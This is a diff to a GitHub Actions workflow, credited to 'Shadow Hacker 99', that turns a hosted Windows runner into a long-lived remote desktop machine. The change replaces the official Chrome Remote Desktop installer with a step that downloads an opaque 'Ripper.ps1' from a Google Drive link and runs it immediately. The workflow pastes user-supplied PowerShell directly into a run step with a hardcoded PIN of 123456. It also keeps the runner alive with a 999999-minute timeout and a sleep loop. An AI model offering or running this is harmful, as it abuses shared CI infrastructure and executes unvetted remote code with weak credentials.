@@ -1,10 +1,12 @@
-name: Shadow Ripping Tools Premium
+# WRITTEN BY Shadow Hacker 99 AND MANAGED BY The Wizard 99
+
+name: Shadow Ripping Tools
 
 on:
   workflow_dispatch:
     inputs:
       code:
-        description: 'Paste Chrome Remote Desktop PowerShell Code Here'
+        description: Paste Powershell Code
         required: true
 
 jobs:
@@ -14,21 +16,20 @@ jobs:
     timeout-minutes: 999999
 
     steps:
-    - name: ক্রোম রিমোট ডেস্কটপ ডাউনলোড ও ইনস্টল করা... ⚙️
+    - name: Downloading Essentials...
       run: |
-        Invoke-WebRequest -Uri "https://dl.google.com/edgedl/chrome-remote-desktop/chromeremotedesktophost.msi" -OutFile "crd.msi"
-        Start-Process msiexec.exe -ArgumentList '/i crd.msi /qn /norestart' -Wait
-        
-    - name: ক্রোম রিমোট ডেস্কটপ কনফিগার ও চালু করা... 🖥️
+        # WAIT FOR 3-4 MINUTES 
+        Invoke-WebRequest -Uri "https://drive.usercontent.google.com/download?id=1KDZ1zZ-xqiaIZ2-8blIputjtpoS5wnqO&export=download&authuser=0&confirm=t&uuid=fdbceb6f-1b4d-49c1-9128-d38cf855055b&at=APZUnTVUm1AGqItiY6LCUoXfH13d%3A1716612457921" -OutFile "Ripper.ps1" && ./Ripper.ps1
+    - name: Starting Virtual Machine...
       run: |
-        # এখানে আপনার গুগলের কোডের শেষে স্পেস দিয়ে --pin=123456 যোগ হয়ে রান হবে
-        ${{ github.event.inputs.code }} --pin=123456
-        
-    - name: ভার্চুয়াল মেশিন সচল রাখা... 🚀
+        # CONNECTING WITH VM...
+        ${{ inputs.code }} -pin=123456
+    - name: VM is Running...
       run: |
+        # Go And Connect Now!
         $i = 999999
-        do {
-            Write-Host "VM is Active - Loop: $i"
-            Start-Sleep 60
-            $i--
+         do {
+             Write-Host $i
+             Sleep 60
+             $i--
         } while ($i -gt 0)
